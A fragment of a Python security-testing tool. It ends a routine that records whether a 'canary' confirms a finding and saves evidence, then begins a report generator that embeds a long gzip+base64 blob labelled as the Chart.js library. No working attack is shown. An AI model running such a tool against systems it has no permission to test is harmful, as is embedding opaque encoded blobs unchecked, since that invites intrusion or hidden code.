        summary = {"verdict": "CANARY_CONFIRMED", "proof_type": "canary",
                   "canary": canary["canary"], "path": canary["path"]}
        print(f"\n  ✅ CANARY CONFIRMED: {canary['canary']}")
    else:
        verdict = "NOT_CONFIRMED"
        summary = {"verdict": "NOT_CONFIRMED"}
        print(f"\n  ⚪ NOT CONFIRMED")

    (Path(evidence_dir) / "summary.json").write_text(
        json.dumps(summary, indent=2, ensure_ascii=False), encoding="utf-8")
    logger.finalize(verdict, result.get("output") if result.get("success") else None)
    return verdict, summary, evidence_dir


# ═══════════════════════════════════════════════════════════════════════
# SECTION 5 — Report Generator (v3 — เน้นกราฟ สถิติ และคำอธิบายเข้าใจง่าย)
# ═══════════════════════════════════════════════════════════════════════

# ─── Chart.js 4.4.3 (gzip+base64, ฝังตรง — ใช้งานออฟไลน์ได้) ───
import gzip as _gzip, base64 as _b64
_CHARTJS_GZ_B64 = (
    "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"
